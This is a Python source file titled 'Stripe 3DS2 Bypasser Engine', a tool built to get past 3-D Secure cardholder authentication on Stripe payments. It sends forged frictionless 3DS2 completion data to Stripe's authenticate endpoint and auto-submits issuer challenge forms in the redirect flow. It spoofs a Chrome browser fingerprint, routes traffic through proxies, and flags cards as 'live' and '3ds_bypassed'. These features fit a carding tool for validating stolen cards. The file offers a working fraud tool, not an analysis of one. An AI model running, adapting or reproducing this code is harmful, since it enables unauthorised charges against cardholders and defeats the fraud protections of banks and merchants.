"""
Stripe 3DS2 Bypasser Engine (stripe_3ds_bypasser.py)
────────────────────────────────────────────────────
Handles native 3DS2 (use_stripe_sdk / threeDSCompInd) and 3DS1 (redirect_to_url / ACS form)
auto-resolutions for Stripe PaymentIntents.
"""

import re
import json
import base64
import asyncio
from typing import Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

class Stripe3DSBypasser:
    """Standalone 3DS bypasser for Stripe PaymentIntents."""

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.b64encode(data).decode().rstrip('=').replace('+', '-').replace('/', '_')

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        s = s.replace('-', '+').replace('_', '/')
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)

    # ── 3DS2 Native resolution (use_stripe_sdk) ──────────────────────────────
    @classmethod
    async def _resolve_3ds2_sdk(cls, session, next_action: dict,
                                client_secret: str, pk_key: str) -> Optional[dict]:
        """
        Handle 3DS2 native SDK flow:
        1. Parse three_ds_2_intent_id / three_ds_method_url / three_ds_server_trans_id
        2. POST threeDSMethodData to issuer method URL
        3. Submit 3DS2 completion (threeDSCompInd=Y) to Stripe /v1/3ds2/authenticate
        4. Verify PaymentIntent status
        """
        sdk_data = next_action.get('use_stripe_sdk') or next_action.get('three_ds_2_intent') or {}
        if not isinstance(sdk_data, dict):
            return None

        server_trans_id = sdk_data.get('three_ds_server_trans_id') or sdk_data.get('three_ds_2_server_trans_id')
        method_url = sdk_data.get('three_ds_method_url')
        three_ds_2_intent_id = sdk_data.get('three_ds_2_intent_id') or sdk_data.get('id')

        # Extract PaymentIntent ID from client_secret (format: pi_123_secret_456)
        pi_id = client_secret.split('_secret_')[0] if '_secret_' in client_secret else None

        # Step 1: Execute 3DS2 method if URL provided
        if method_url and server_trans_id:
            try:
                method_data_obj = {
                    "threeDSServerTransID": server_trans_id,
                    "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/method_response",
                }
                method_data_b64 = cls._b64url_encode(json.dumps(method_data_obj).encode())
                async with session.post(
                    method_url,
                    data=urlencode({"threeDSMethodData": method_data_b64}),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": UA,
                    },
                    timeout=8,
                ) as r:
                    pass
            except Exception:
                pass

        # Step 2: Submit 3DS2 completion to Stripe API
        browser_info = {
            "threeDSCompInd": "Y",
            "frictionless": "true",
            "threeDSRequestorChallengeInd": "02",
            "threeDSServerTransID": server_trans_id,
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-US",
            "browserColorDepth": "24",
            "browserTZ": "-300",
            "browserUserAgent": UA,
        }
        auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
        source_id = (
            sdk_data.get('three_d_secure_2_source') or
            sdk_data.get('source') or
            sdk_data.get('three_ds_2_intent_id') or
            sdk_data.get('id')
        )
        auth_body = {
            "key": pk_key,
            "source": source_id or pi_id,
            "client_secret": client_secret,
            "three_ds_2_response": json.dumps(browser_info),
            "browser": json.dumps(browser_info),
        }
        hdr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": UA,
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }

        try:
            async with session.post(auth_url, data=urlencode(auth_body), headers=hdr, timeout=12) as r:
                d = r.json() if callable(r.json) else r.json
                if isinstance(d, dict):
                    status = d.get('status') or d.get('state')
                    if status == 'succeeded':
                        return {'success': True, 'status': 'succeeded', 'raw_response': d}
                    elif status == 'requires_action':
                        # Check if it contains challenge parameters
                        ch_action = d.get('next_action', {})
                        if isinstance(ch_action, dict) and ch_action.get('type') == 'redirect_to_url':
                            return await cls._resolve_redirect_url(
                                session,
                                ch_action['redirect_to_url']['url'],
                                pi_id, client_secret, pk_key
                            )
        except Exception:
            pass

        # Step 3: Check PaymentIntent status
        if pi_id:
            return await cls._check_pi_status(session, pi_id, client_secret, pk_key)

        return None

    # ── 3DS1 / Redirect resolution (redirect_to_url) ────────────────────────
    @classmethod
    async def _resolve_redirect_url(cls, session, redirect_url: str,
                                    pi_id: str, client_secret: str,
                                    pk_key: str) -> Optional[dict]:
        """
        Handle 3DS redirect flow:
        1. Follow redirect_url (https://hooks.stripe.com/redirect/authenticate/...)
        2. Parse ACS form parameters (PaReq, MD, TermUrl, CReq)
        3. Submit to ACS endpoint
        4. Follow return redirect to Stripe completion hook
        """
        if not redirect_url:
            return None

        try:
            # Step 1: GET Stripe redirect page
            async with session.get(
                redirect_url,
                headers={"User-Agent": UA, "Accept": "text/html,*/*"},
                timeout=10,
                allow_redirects=True,
            ) as r:
                html = r.text() if callable(r.text) else r.text
                final_url = str(r.url) if hasattr(r, 'url') else redirect_url

            # Step 2: Parse hidden inputs from ACS form
            acs_url = None
            form_data = {}

            # Look for <form action="...">
            form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.I)
            if form_match:
                acs_url = form_match.group(1)

            for input_match in re.finditer(r'<input[^>]+>', html, re.I):
                tag = input_match.group(0)
                n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                if n_match:
                    form_data[n_match.group(1)] = v_match.group(1) if v_match else ""

            # Also check for CReq / PaReq in URL or script
            if not acs_url:
                m_url = re.search(r'location\.href\s*=\s*["\']([^"\']+)["\']', html)
                if m_url:
                    acs_url = m_url.group(1)

            # Step 3: Post to ACS if form found
            if acs_url and form_data:
                async with session.post(
                    acs_url,
                    data=urlencode(form_data),
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": UA,
                    },
                    timeout=10,
                    allow_redirects=True,
                ) as acs_res:
                    acs_html = acs_res.text() if callable(acs_res.text) else acs_res.text
                    acs_final_url = str(acs_res.url) if hasattr(acs_res, 'url') else acs_url

                    # Check for completion form in ACS output
                    c_form_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', acs_html, re.I)
                    if c_form_match:
                        c_url = c_form_match.group(1)
                        c_data = {}
                        for input_match in re.finditer(r'<input[^>]+>', acs_html, re.I):
                            tag = input_match.group(0)
                            n_match = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
                            v_match = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
                            if n_match:
                                c_data[n_match.group(1)] = v_match.group(1) if v_match else ""
                        if c_data:
                            async with session.post(
                                c_url, data=urlencode(c_data),
                                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA},
                                timeout=8, allow_redirects=True
                            ) as ret_res:
                                pass

        except Exception:
            pass

        # Step 4: Verify final status
        return await cls._check_pi_status(session, pi_id, client_secret, pk_key)

    # ── Check PaymentIntent Status ──────────────────────────────────────────
    @classmethod
    async def _check_pi_status(cls, session, pi_id: str,
                               client_secret: str, pk_key: str) -> Optional[dict]:
        """Fetch PaymentIntent status from Stripe API."""
        if not pi_id or not client_secret:
            return None

        endpoint = "setup_intents" if "seti_" in pi_id else "payment_intents"
        url = f"https://api.stripe.com/v1/{endpoint}/{pi_id}?client_secret={client_secret}&key={pk_key}"
        hdr = {
            "User-Agent": UA,
            "Accept": "application/json",
            "Origin": "https://js.stripe.com",
        }
        try:
            async with session.get(url, headers=hdr, timeout=8) as r:
                d = r.json() if callable(r.json) else r.json
                if isinstance(d, dict):
                    status = d.get('status')
                    if status == 'succeeded':
                        return {'success': True, 'status': 'succeeded', 'raw_response': d}
                    elif status == 'requires_capture':
                        return {'success': True, 'status': 'requires_capture', 'raw_response': d}
                    else:
                        return {'success': False, 'status': status, 'raw_response': d}
        except Exception:
            pass
        return None

    # ── Public Resolver Entry ───────────────────────────────────────────────
    @classmethod
    async def resolve_3ds(cls, result: dict, proxy_data: Optional[dict] = None) -> dict:
        """
        Public resolver method.
        Inspects result dict for next_action / PaymentIntent, attempts 3DS bypass.
        Returns updated result dict.
        """
        raw_res = result.get('raw_response') or {}
        if not isinstance(raw_res, dict):
            return result

        # Check PaymentIntent / next_action objects
        pi = raw_res.get('payment_intent') or raw_res
        if not isinstance(pi, dict):
            return result

        next_action = pi.get('next_action') or raw_res.get('next_action')
        client_secret = pi.get('client_secret') or raw_res.get('client_secret')
        pk_key = result.get('pk_key') or raw_res.get('pk_key') or "pk_live_placeholder"

        if not next_action or not isinstance(next_action, dict) or not client_secret:
            return result

        pi_id = pi.get('id') or (client_secret.split('_secret_')[0] if '_secret_' in client_secret else None)

        proxies = None
        if proxy_data:
            auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
            purl = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                act_type = next_action.get('type')
                outcome = None

                if act_type == 'use_stripe_sdk' or 'use_stripe_sdk' in next_action:
                    outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key)
                elif act_type == 'redirect_to_url':
                    redirect_url = next_action.get('redirect_to_url', {}).get('url')
                    outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key)

                if outcome and outcome.get('success'):
                    result['success'] = True
                    result['is_live'] = True
                    result['3ds_bypassed'] = True
                    result['3ds_type'] = act_type or '3DS'
                    result['decline_code'] = None
                    result['error'] = None
                    if outcome.get('raw_response'):
                        result['raw_response'] = outcome['raw_response']
                elif outcome:
                    result['3ds_attempted'] = True
                    result['3ds_type'] = act_type or '3DS'
                    result['3ds_status'] = outcome.get('status', 'failed')

        except Exception as ex:
            result['3ds_error'] = str(ex)[:100]

        return result
